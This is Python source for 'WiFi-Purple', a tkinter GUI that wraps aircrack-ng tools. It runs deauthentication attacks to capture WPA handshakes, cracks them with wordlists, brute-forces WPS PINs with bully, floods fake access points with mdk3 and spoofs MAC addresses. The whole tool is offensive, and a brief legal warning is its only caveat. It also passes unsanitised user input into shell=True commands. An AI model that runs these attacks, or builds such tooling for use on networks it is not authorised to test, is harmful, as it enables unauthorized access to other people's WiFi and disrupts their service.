#!/usr/bin/env python3
"""
WiFi-Purple GUI - WiFi Security Testing Tool
By EmreKybs
"""

import os
import sys
import subprocess
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from typing import Optional
import time


class WiFiPurpleGUI:
    """GUI Application for WiFi-Purple"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi-Purple - WiFi Security Testing Tool")
        self.root.geometry("1200x800")
        self.root.resizable(True, True)
        
        # Color scheme - Modern purple theme
        self.bg_color = "#1a1a2e"
        self.fg_color = "#eee"
        self.accent_color = "#9d4edd"
        self.button_color = "#7b2cbf"
        self.success_color = "#06ffa5"
        self.error_color = "#ff006e"
        self.warning_color = "#ffd60a"
        self.info_color = "#00b4d8"
        
        self.root.configure(bg=self.bg_color)
        
        # Variables to store common inputs
        self.interface_var = tk.StringVar(value="wlan0")
        self.monitor_interface_var = tk.StringVar(value="wlan0mon")
        self.last_bssid = ""
        self.last_channel = ""
        
        # Check root privileges
        if os.geteuid() != 0:
            messagebox.showerror(
                "Root Required",
                "This application requires root privileges!\n\nPlease run with: sudo python3 wifi_purple_gui.py"
            )
            sys.exit(1)
        
        self.setup_ui()
        self.show_welcome_message()
        
    def setup_ui(self):
        """Setup the user interface"""
        # Configure style
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color, font=('Arial', 10))
        style.configure('Title.TLabel', font=('Arial', 18, 'bold'), foreground=self.accent_color)
        style.configure('Subtitle.TLabel', font=('Arial', 10, 'italic'), foreground=self.info_color)
        style.configure('Section.TLabel', font=('Arial', 12, 'bold'), foreground=self.warning_color)
        
        # Header with gradient effect
        header_frame = tk.Frame(self.root, bg=self.bg_color)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = ttk.Label(
            header_frame,
            text="WiFi-Purple",
            style='Title.TLabel'
        )
        title_label.pack()
        
        subtitle_label = ttk.Label(
            header_frame,
            text="WiFi Security Testing Tool - By EmreKybs",
            style='Subtitle.TLabel'
        )
        subtitle_label.pack()
        
        # Quick Settings Panel
        settings_frame = tk.LabelFrame(
            self.root,
            text=" Quick Settings ",
            bg=self.bg_color,
            fg=self.warning_color,
            font=('Arial', 10, 'bold'),
            relief=tk.RIDGE,
            bd=2
        )
        settings_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Interface settings
        settings_inner = tk.Frame(settings_frame, bg=self.bg_color)
        settings_inner.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(
            settings_inner,
            text="Normal Interface:",
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Arial', 9)
        ).grid(row=0, column=0, padx=5, pady=2, sticky=tk.W)
        
        interface_entry = tk.Entry(
            settings_inner,
            textvariable=self.interface_var,
            bg="#0f0f1e",
            fg=self.success_color,
            font=('Arial', 10),
            width=15
        )
        interface_entry.grid(row=0, column=1, padx=5, pady=2)
        
        tk.Label(
            settings_inner,
            text="Monitor Interface:",
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Arial', 9)
        ).grid(row=0, column=2, padx=5, pady=2, sticky=tk.W)
        
        monitor_entry = tk.Entry(
            settings_inner,
            textvariable=self.monitor_interface_var,
            bg="#0f0f1e",
            fg=self.success_color,
            font=('Arial', 10),
            width=15
        )
        monitor_entry.grid(row=0, column=3, padx=5, pady=2)
        
        # Help button
        help_btn = tk.Button(
            settings_inner,
            text="[?] Help",
            command=self.show_help,
            bg=self.info_color,
            fg='white',
            font=('Arial', 9, 'bold'),
            cursor='hand2',
            relief=tk.FLAT
        )
        help_btn.grid(row=0, column=4, padx=10, pady=2)
        
        # Main container with notebook (tabs)
        main_container = ttk.Notebook(self.root)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Tab 1: Main Tools
        tools_tab = tk.Frame(main_container, bg=self.bg_color)
        main_container.add(tools_tab, text=" Main Tools ")
        
        # Split tools tab
        tools_left = tk.Frame(tools_tab, bg=self.bg_color)
        tools_left.pack(side=tk.LEFT, fill=tk.BOTH, padx=5, pady=5)
        
        tools_right = tk.Frame(tools_tab, bg=self.bg_color)
        tools_right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Control buttons in left
        self.create_control_buttons(tools_left)
        
        # Output console in right
        self.create_output_console(tools_right)
        
        # Tab 2: Advanced
        advanced_tab = tk.Frame(main_container, bg=self.bg_color)
        main_container.add(advanced_tab, text=" Advanced ")
        
        self.create_advanced_tab(advanced_tab)
        
        # Tab 3: Saved Data
        saved_tab = tk.Frame(main_container, bg=self.bg_color)
        main_container.add(saved_tab, text=" Saved Data ")
        
        self.create_saved_data_tab(saved_tab)
        
        # Status bar with more info
        status_frame = tk.Frame(self.root, bg=self.bg_color)
        status_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)
        
        self.status_var = tk.StringVar(value="[+] Ready")
        status_bar = tk.Label(
            status_frame,
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            anchor=tk.W,
            bg="#0f0f1e",
            fg=self.success_color,
            font=('Arial', 9, 'bold')
        )
        status_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Clear console button
        clear_btn = tk.Button(
            status_frame,
            text="[X] Clear Console",
            command=self.clear_console,
            bg=self.error_color,
            fg='white',
            font=('Arial', 8, 'bold'),
            cursor='hand2',
            relief=tk.FLAT
        )
        clear_btn.pack(side=tk.RIGHT, padx=5)
        
    def create_control_buttons(self, parent):
        """Create control buttons with categories"""
        # Setup Section
        setup_frame = tk.LabelFrame(
            parent,
            text=" Setup ",
            bg=self.bg_color,
            fg=self.success_color,
            font=('Arial', 10, 'bold')
        )
        setup_frame.pack(fill=tk.X, pady=5, padx=5)
        
        setup_buttons = [
            ("[+] Start Monitor", self.start_monitor_mode, "Enable monitor mode"),
            ("[-] Stop Monitor", self.stop_monitor_mode, "Disable monitor mode"),
            ("[i] View Interfaces", self.view_interfaces, "Show interfaces"),
            ("[R] Restart Network", self.restart_network, "Restart network"),
        ]
        
        for text, command, tooltip in setup_buttons:
            self.create_button(setup_frame, text, command, tooltip)
        
        # Scanning Section
        scan_frame = tk.LabelFrame(
            parent,
            text=" Scanning ",
            bg=self.bg_color,
            fg=self.info_color,
            font=('Arial', 10, 'bold')
        )
        scan_frame.pack(fill=tk.X, pady=5, padx=5)
        
        scan_buttons = [
            ("[S] Scan Networks", self.scan_networks, "Scan WiFi networks"),
            ("[C] Capture Handshake", self.capture_handshake, "Capture handshake"),
        ]
        
        for text, command, tooltip in scan_buttons:
            self.create_button(scan_frame, text, command, tooltip)
        
        # Attack Section
        attack_frame = tk.LabelFrame(
            parent,
            text=" Attacks ",
            bg=self.bg_color,
            fg=self.error_color,
            font=('Arial', 10, 'bold')
        )
        attack_frame.pack(fill=tk.X, pady=5, padx=5)
        
        attack_buttons = [
            ("[K] Crack Password", self.crack_password, "Crack handshake"),
            ("[W] WPS Attack", self.wps_attack, "WPS PIN attack"),
            ("[F] Fake AP", self.fake_ap, "Create fake AP"),
        ]
        
        for text, command, tooltip in attack_buttons:
            self.create_button(attack_frame, text, command, tooltip)
        
        # Utilities Section
        util_frame = tk.LabelFrame(
            parent,
            text=" Utilities ",
            bg=self.bg_color,
            fg=self.warning_color,
            font=('Arial', 10, 'bold')
        )
        util_frame.pack(fill=tk.X, pady=5, padx=5)
        
        util_buttons = [
            ("[M] Change MAC", self.change_mac, "Spoof MAC address"),
        ]
        
        for text, command, tooltip in util_buttons:
            self.create_button(util_frame, text, command, tooltip)
    
    def create_button(self, parent, text, command, tooltip):
        """Create a styled button with hover effect"""
        btn = tk.Button(
            parent,
            text=text,
            command=command,
            bg=self.button_color,
            fg='white',
            font=('Arial', 9, 'bold'),
            relief=tk.FLAT,
            cursor='hand2',
            height=2
        )
        btn.pack(pady=3, padx=8, fill=tk.X)
        
        # Hover effect
        btn.bind('<Enter>', lambda e: btn.config(bg=self.accent_color))
        btn.bind('<Leave>', lambda e: btn.config(bg=self.button_color))
        
        # Tooltip (simple)
        btn.bind('<Button-3>', lambda e: messagebox.showinfo("Info", tooltip))
    
    def create_output_console(self, parent):
        """Create output console with controls"""
        console_label = tk.Label(
            parent,
            text="Output Console",
            bg=self.bg_color,
            fg=self.warning_color,
            font=('Arial', 11, 'bold')
        )
        console_label.pack(anchor=tk.W, pady=(0, 5))
        
        # Output text area
        self.output_text = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            width=70,
            height=35,
            bg="#0f0f1e",
            fg=self.success_color,
            font=('Consolas', 9),
            insertbackground=self.success_color
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)
    
    def create_advanced_tab(self, parent):
        """Create advanced tools tab"""
        info_label = tk.Label(
            parent,
            text="Advanced Tools - Coming Soon",
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Arial', 14, 'bold')
        )
        info_label.pack(pady=20)
        
        desc = tk.Label(
            parent,
            text="Advanced features like custom scripts,\nautomatic attacks, and more will be added here.",
            bg=self.bg_color,
            fg=self.fg_color,
            font=('Arial', 10),
            justify=tk.CENTER
        )
        desc.pack(pady=10)
    
    def create_saved_data_tab(self, parent):
        """Create saved data management tab"""
        tk.Label(
            parent,
            text="Saved Handshakes & Data",
            bg=self.bg_color,
            fg=self.accent_color,
            font=('Arial', 12, 'bold')
        ).pack(pady=10)
        
        # Listbox for saved files
        list_frame = tk.Frame(parent, bg=self.bg_color)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.saved_files_list = tk.Listbox(
            list_frame,
            bg="#0f0f1e",
            fg=self.success_color,
            font=('Consolas', 10),
            selectmode=tk.SINGLE
        )
        self.saved_files_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.saved_files_list.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.saved_files_list.yview)
        
        # Buttons
        btn_frame = tk.Frame(parent, bg=self.bg_color)
        btn_frame.pack(pady=10)
        
        tk.Button(
            btn_frame,
            text="[R] Refresh List",
            command=self.refresh_saved_files,
            bg=self.button_color,
            fg='white',
            font=('Arial', 9, 'bold'),
            cursor='hand2'
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            btn_frame,
            text="[O] Open Folder",
            command=lambda: os.system("xdg-open /tmp &"),
            bg=self.info_color,
            fg='white',
            font=('Arial', 9, 'bold'),
            cursor='hand2'
        ).pack(side=tk.LEFT, padx=5)
        
        self.refresh_saved_files()
    
    def show_welcome_message(self):
        """Show welcome message"""
        welcome = """
================================================================
           Welcome to WiFi-Purple Security Tool!
================================================================

[Quick Start Guide]
1. Start Monitor Mode on your WiFi adapter
2. Scan for nearby networks
3. Select your target and capture handshake
4. Crack the password using a wordlist

[!] LEGAL WARNING:
Only use this tool on networks you own or have permission to test!
Unauthorized access to networks is illegal.

[*] Tips:
- Right-click buttons for more info
- Use Quick Settings to set your interface names
- Check the Saved Data tab for captured files

Ready to start!
"""
        self.log(welcome, self.info_color)
    
    def clear_console(self):
        """Clear the output console"""
        self.output_text.delete(1.0, tk.END)
        self.log("Console cleared.", self.warning_color)
    
    def show_help(self):
        """Show help dialog"""
        help_text = """
WiFi-Purple Help Guide
======================

SETUP:
- Start Monitor Mode: Enable monitoring on WiFi adapter
- Stop Monitor Mode: Return to normal mode
- View Interfaces: See all network interfaces
- Restart Network: Fix network issues

SCANNING:
- Scan Networks: Find nearby WiFi networks
- Capture Handshake: Capture WPA/WPA2 handshake

ATTACKS:
- Crack Password: Use wordlist to crack handshake
- WPS Attack: Attack WPS-enabled routers
- Fake AP: Create fake access points

UTILITIES:
- Change MAC: Spoof your MAC address

TIPS:
[+] Always start with Monitor Mode
[+] Use large wordlists for better success
[+] Be patient - attacks take time
[+] Check Saved Data tab for captures

[!] Use responsibly and legally!
"""
        messagebox.showinfo("Help Guide", help_text)
    
    def refresh_saved_files(self):
        """Refresh saved files list"""
        self.saved_files_list.delete(0, tk.END)
        
        # Check common directories
        dirs_to_check = ["/tmp", os.path.expanduser("~")]
        
        for directory in dirs_to_check:
            try:
                for file in os.listdir(directory):
                    if file.endswith(('.cap', '.pcap', '.csv', '.kismet')):
                        full_path = os.path.join(directory, file)
                        size = os.path.getsize(full_path)
                        self.saved_files_list.insert(tk.END, f"{full_path} ({size} bytes)")
            except:
                pass
    
    def log(self, message: str, color: str = None):
        """Log message to output console with timestamp"""
        timestamp = time.strftime("[%H:%M:%S]")
        full_message = f"{timestamp} {message}"
        
        self.output_text.insert(tk.END, full_message + "\n")
        if color:
            # Apply color tag
            start_idx = self.output_text.index(f"end-{len(full_message)+1}c")
            end_idx = self.output_text.index("end-1c")
            tag_name = f"color_{color}"
            self.output_text.tag_add(tag_name, start_idx, end_idx)
            self.output_text.tag_config(tag_name, foreground=color)
        
        self.output_text.see(tk.END)
        self.output_text.update()
    
    def run_command_async(self, cmd: str, description: str):
        """Run command in separate thread"""
        def run():
            self.status_var.set(f"Running: {description}...")
            self.log(f"\n{'='*60}", self.accent_color)
            self.log(f"🚀 {description}", self.accent_color)
            self.log(f"{'='*60}", self.accent_color)
            self.log(f"Command: {cmd}\n", "#888")
            
            try:
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                
                for line in process.stdout:
                    self.log(line.rstrip())
                
                process.wait()
                
                if process.returncode == 0:
                    self.log(f"\n[+] {description} completed successfully!", self.success_color)
                else:
                    self.log(f"\n[!] Command failed with code {process.returncode}", self.error_color)
                
            except Exception as e:
                self.log(f"\n[!] Error: {str(e)}", self.error_color)
            
            self.status_var.set("Ready")
        
        thread = threading.Thread(target=run, daemon=True)
        thread.start()
    
    def start_monitor_mode(self):
        """Start monitor mode"""
        interface = self.interface_var.get()
        
        if messagebox.askyesno(
            "Start Monitor Mode",
            f"Start monitor mode on {interface}?\n\nThis will:\n• Kill interfering processes\n• Enable monitor mode\n• Change interface to {interface}mon"
        ):
            self.log(f"\n{'='*60}", self.accent_color)
            self.log("[+] Starting Monitor Mode...", self.accent_color)
            cmd = f"airmon-ng check kill && airmon-ng start {interface}"
            self.run_command_async(cmd, "Starting Monitor Mode")
            
            # Update monitor interface name
            self.monitor_interface_var.set(f"{interface}mon")
    
    def stop_monitor_mode(self):
        """Stop monitor mode"""
        interface = self.monitor_interface_var.get()
        
        if messagebox.askyesno(
            "Stop Monitor Mode",
            f"Stop monitor mode on {interface}?"
        ):
            self.log(f"\n{'='*60}", self.accent_color)
            self.log("[-] Stopping Monitor Mode...", self.accent_color)
            cmd = f"airmon-ng stop {interface}"
            self.run_command_async(cmd, "Stopping Monitor Mode")
    
    def view_interfaces(self):
        """View network interfaces"""
        self.run_command_async("ifconfig", "Viewing Network Interfaces")
    
    def restart_network(self):
        """Restart network manager"""
        if messagebox.askyesno("Confirm", "Restart NetworkManager?"):
            cmd = "service NetworkManager stop && service NetworkManager start && airmon-ng check kill"
            self.run_command_async(cmd, "Restarting Network")
    
    def scan_networks(self):
        """Scan for networks"""
        interface = self.monitor_interface_var.get()
        
        self.log(f"\n{'='*60}", self.accent_color)
        self.log("[*] Starting Network Scan...", self.accent_color)
        self.log(f"Interface: {interface}", self.info_color)
        self.log("\n[!] Opening new terminal for network scanning...", self.warning_color)
        self.log("[!] Press CTRL+C in the terminal window to stop", self.error_color)
        self.log("\n[*] TIP: Note down the BSSID and Channel of your target!", self.info_color)
        
        # Open in new terminal window with larger size
        # xterm: -geometry WIDTHxHEIGHT (columns x rows)
        # -fa for font, -fs for font size
        cmd = f"xterm -geometry 180x45 -fa 'Monospace' -fs 11 -bg black -fg green -hold -e 'airodump-ng {interface} -M --band abg' &"
        
        # Alternative for gnome-terminal with larger size
        alt_cmd = f"gnome-terminal --geometry=180x45 -- bash -c 'airodump-ng {interface} -M --band abg; echo; echo Press ENTER to close; read'"
        
        try:
            # Try xterm first
            subprocess.Popen(cmd, shell=True)
            self.log("✅ Scan started in new terminal window", self.success_color)
        except:
            try:
                # Try gnome-terminal
                subprocess.Popen(alt_cmd, shell=True)
                self.log("[+] Scan started in new terminal window", self.success_color)
            except Exception as e:
                self.log(f"[!] Could not open terminal: {e}", self.error_color)
    
    def capture_handshake(self):
        """Capture handshake"""
        interface = self.monitor_interface_var.get()
        
        # Ask if user wants to scan first
        if messagebox.askyesno(
            "Scan First?",
            "Do you want to scan for networks first?\n\n(Recommended if you don't know the target details)"
        ):
            self.log(f"\n{'='*60}", self.accent_color)
            self.log("[*] Opening scan window - Find your target...", self.accent_color)
            self.log("[*] Note the BSSID and Channel!", self.info_color)
            
            # Open scan in new terminal with larger size
            try:
                subprocess.Popen(f"xterm -geometry 180x45 -fa 'Monospace' -fs 11 -bg black -fg green -hold -e 'airodump-ng {interface} -M --band abg' &", shell=True)
            except:
                try:
                    subprocess.Popen(f"gnome-terminal --geometry=180x45 -- bash -c 'airodump-ng {interface} -M --band abg; read'", shell=True)
                except:
                    pass
            
            time.sleep(2)
        
        # Now get target details with improved dialog
        dialog = ImprovedInputDialog(
            self.root,
            "Enter Target Details",
            [
                ("Target BSSID (MAC)", self.last_bssid, "Example: AA:BB:CC:DD:EE:FF"),
                ("Channel", self.last_channel, "Example: 6"),
                ("Output Path", "/tmp/handshake", "Where to save capture"),
                ("Deauth Packets", "10", "0 = continuous, 10 = recommended")
            ]
        )
        
        if dialog.result:
            bssid, channel, output, packets = dialog.result
            
            if not bssid or not channel:
                messagebox.showerror("Error", "BSSID and Channel are required!")
                return
            
            # Save for next time
            self.last_bssid = bssid
            self.last_channel = channel
            
            self.log(f"\n{'='*60}", self.accent_color)
            self.log("[*] Starting Handshake Capture...", self.accent_color)
            self.log(f"Target: {bssid} on Channel {channel}", self.info_color)
            self.log(f"Output: {output}-01.cap", self.info_color)
            self.log("\n[!] Opening capture windows...", self.warning_color)
            
            # Open capture in new terminal with both commands
            capture_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}"
            deauth_cmd = f"sleep 5 && aireplay-ng -0 {packets} -a {bssid} {interface}"
            
            try:
                # Start capture in terminal (larger window)
                subprocess.Popen(f"xterm -geometry 180x40 -fa 'Monospace' -fs 11 -bg black -fg cyan -title 'Capturing Handshake' -hold -e '{capture_cmd}' &", shell=True)
                # Start deauth in another terminal
                subprocess.Popen(f"xterm -geometry 120x30 -fa 'Monospace' -fs 11 -bg black -fg red -title 'Deauth Attack' -hold -e '{deauth_cmd}' &", shell=True)
                self.log("✅ Capture and deauth started in separate terminals", self.success_color)
                self.log(f"📁 Handshake will be saved to: {output}-01.cap", self.accent_color)
            except:
                try:
                    subprocess.Popen(f"gnome-terminal --geometry=180x40 --title='Capturing Handshake' -- bash -c '{capture_cmd}' &", shell=True)
                    subprocess.Popen(f"gnome-terminal --geometry=120x30 --title='Deauth Attack' -- bash -c '{deauth_cmd}; read' &", shell=True)
                    self.log("✅ Capture and deauth started in separate terminals", self.success_color)
                except Exception as e:
                    self.log(f"❌ Error: {e}", self.error_color)
    
    def crack_password(self):
        """Crack password"""
        handshake_file = filedialog.askopenfilename(
            title="Select Handshake File",
            filetypes=[("Cap files", "*.cap"), ("All files", "*.*")]
        )
        
        if not handshake_file:
            return
        
        wordlist_file = filedialog.askopenfilename(
            title="Select Wordlist",
            initialdir="/usr/share/wordlists",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not wordlist_file:
            return
        
        cmd = f"aircrack-ng {handshake_file} -w {wordlist_file}"
        self.run_command_async(cmd, "Cracking Password")
    
    def wps_attack(self):
        """WPS attack"""
        dialog = InputDialog(self.root, "WPS Attack", [
            ("Monitor Interface", "wlan0mon"),
            ("Target BSSID", ""),
            ("Channel", ""),
            ("ESSID", "")
        ])
        
        if dialog.result:
            interface, bssid, channel, essid = dialog.result
            cmd = f"bully {interface} -b {bssid} -c {channel} -e {essid} --force -F -v 3"
            self.run_command_async(cmd, "WPS Attack")
    
    def change_mac(self):
        """Change MAC address"""
        dialog = InputDialog(self.root, "Change MAC Address", [
            ("Interface", "wlan0"),
            ("New MAC Address", "00:11:22:33:44:55")
        ])
        
        if dialog.result:
            interface, new_mac = dialog.result
            cmd = f"ifconfig {interface} down && ifconfig {interface} hw ether {new_mac} && ifconfig {interface} up && ifconfig {interface}"
            self.run_command_async(cmd, "Changing MAC Address")
    
    def fake_ap(self):
        """Create fake AP"""
        dialog = InputDialog(self.root, "Fake Access Point", [
            ("Interface", "wlan0"),
            ("Channel", "6"),
            ("Dictionary Path", "/wordlist/fakeAP.txt")
        ])
        
        if dialog.result:
            interface, channel, dictionary = dialog.result
            
            # Check if dictionary exists
            if not os.path.exists(dictionary):
                if messagebox.askyesno("Dictionary Not Found", 
                                      f"Dictionary file not found: {dictionary}\n\nCreate it now?"):
                    # Create sample dictionary
                    os.makedirs(os.path.dirname(dictionary), exist_ok=True)
                    with open(dictionary, 'w') as f:
                        f.write("FreeWiFi\nFreeInternet\nPublicWiFi\nGuestNetwork\n")
                    self.log(f"✅ Created sample dictionary at {dictionary}", self.success_color)
                else:
                    return
            
            self.log("\n⚠️ Opening fake AP attack in new terminal...", self.accent_color)
            cmd = f"mdk3 {interface} b -f {dictionary} -a -s 1000 -c {channel}"
            
            try:
                subprocess.Popen(f"xterm -geometry 150x35 -fa 'Monospace' -fs 11 -bg black -fg magenta -title 'Fake AP Attack' -hold -e '{cmd}' &", shell=True)
                self.log("✅ Fake AP attack started in new terminal", self.success_color)
            except:
                try:
                    subprocess.Popen(f"gnome-terminal --geometry=150x35 --title='Fake AP Attack' -- bash -c '{cmd}; read' &", shell=True)
                    self.log("✅ Fake AP attack started in new terminal", self.success_color)
                except Exception as e:
                    self.log(f"❌ Error: {e}", self.error_color)


class InputDialog:
    """Custom input dialog"""
    
    def __init__(self, parent, title, fields):
        self.result = None
        
        self.dialog = tk.Toplevel(parent)
        self.dialog.title(title)
        self.dialog.geometry("400x300")
        self.dialog.configure(bg="#1a1a2e")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        # Center dialog
        self.dialog.update_idletasks()
        x = (self.dialog.winfo_screenwidth() // 2) - (400 // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (300 // 2)
        self.dialog.geometry(f"+{x}+{y}")
        
        self.entries = []
        
        # Create input fields
        for i, (label_text, default_value) in enumerate(fields):
            label = tk.Label(
                self.dialog,
                text=label_text + ":",
                bg="#1a1a2e",
                fg="#eee",
                font=('Arial', 10)
            )
            label.grid(row=i, column=0, padx=20, pady=10, sticky=tk.W)
            
            entry = tk.Entry(
                self.dialog,
                width=30,
                bg="#0f0f1e",
                fg="#06ffa5",
                font=('Arial', 10),
                insertbackground="#06ffa5"
            )
            entry.insert(0, default_value)
            entry.grid(row=i, column=1, padx=20, pady=10)
            self.entries.append(entry)
        
        # Buttons
        button_frame = tk.Frame(self.dialog, bg="#1a1a2e")
        button_frame.grid(row=len(fields), column=0, columnspan=2, pady=20)
        
        ok_btn = tk.Button(
            button_frame,
            text="OK",
            command=self.ok,
            bg="#7b2cbf",
            fg="white",
            font=('Arial', 10, 'bold'),
            width=10,
            cursor='hand2'
        )
        ok_btn.pack(side=tk.LEFT, padx=5)
        
        cancel_btn = tk.Button(
            button_frame,
            text="Cancel",
            command=self.cancel,
            bg="#555",
            fg="white",
            font=('Arial', 10, 'bold'),
            width=10,
            cursor='hand2'
        )
        cancel_btn.pack(side=tk.LEFT, padx=5)
        
        self.dialog.wait_window()
    
    def ok(self):
        self.result = [entry.get() for entry in self.entries]
        self.dialog.destroy()
    
    def cancel(self):
        self.dialog.destroy()


class ImprovedInputDialog:
    """Improved input dialog with hints"""
    
    def __init__(self, parent, title, fields):
        self.result = None
        
        self.dialog = tk.Toplevel(parent)
        self.dialog.title(title)
        self.dialog.geometry("550x400")
        self.dialog.configure(bg="#1a1a2e")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        # Center dialog
        self.dialog.update_idletasks()
        x = (self.dialog.winfo_screenwidth() // 2) - (550 // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (400 // 2)
        self.dialog.geometry(f"+{x}+{y}")
        
        # Title
        title_label = tk.Label(
            self.dialog,
            text=title,
            bg="#1a1a2e",
            fg="#9d4edd",
            font=('Arial', 14, 'bold')
        )
        title_label.pack(pady=15)
        
        # Frame for inputs
        input_frame = tk.Frame(self.dialog, bg="#1a1a2e")
        input_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.entries = []
        
        # Create input fields with hints
        for i, field_data in enumerate(fields):
            label_text, default_value, hint = field_data
            
            # Label
            label = tk.Label(
                input_frame,
                text=label_text + ":",
                bg="#1a1a2e",
                fg="#eee",
                font=('Arial', 10, 'bold')
            )
            label.grid(row=i*2, column=0, padx=10, pady=(10, 2), sticky=tk.W)
            
            # Entry
            entry = tk.Entry(
                input_frame,
                width=40,
                bg="#0f0f1e",
                fg="#06ffa5",
                font=('Arial', 10),
                insertbackground="#06ffa5"
            )
            entry.insert(0, default_value)
            entry.grid(row=i*2, column=1, padx=10, pady=(10, 2), sticky=tk.W)
            self.entries.append(entry)
            
            # Hint
            hint_label = tk.Label(
                input_frame,
                text=f"💡 {hint}",
                bg="#1a1a2e",
                fg="#888",
                font=('Arial', 8, 'italic')
            )
            hint_label.grid(row=i*2+1, column=1, padx=10, pady=(0, 5), sticky=tk.W)
        
        # Buttons
        button_frame = tk.Frame(self.dialog, bg="#1a1a2e")
        button_frame.pack(pady=20)
        
        ok_btn = tk.Button(
            button_frame,
            text="✓ OK",
            command=self.ok,
            bg="#06ffa5",
            fg="black",
            font=('Arial', 11, 'bold'),
            width=12,
            height=2,
            cursor='hand2',
            relief=tk.FLAT
        )
        ok_btn.pack(side=tk.LEFT, padx=10)
        
        cancel_btn = tk.Button(
            button_frame,
            text="✗ Cancel",
            command=self.cancel,
            bg="#ff006e",
            fg="white",
            font=('Arial', 11, 'bold'),
            width=12,
            height=2,
            cursor='hand2',
            relief=tk.FLAT
        )
        cancel_btn.pack(side=tk.LEFT, padx=10)
        
        # Bind Enter key
        self.dialog.bind('<Return>', lambda e: self.ok())
        self.dialog.bind('<Escape>', lambda e: self.cancel())
        
        self.dialog.wait_window()
    
    def ok(self):
        self.result = [entry.get() for entry in self.entries]
        self.dialog.destroy()
    
    def cancel(self):
        self.dialog.destroy()


def main():
    """Entry point"""
    root = tk.Tk()
    app = WiFiPurpleGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
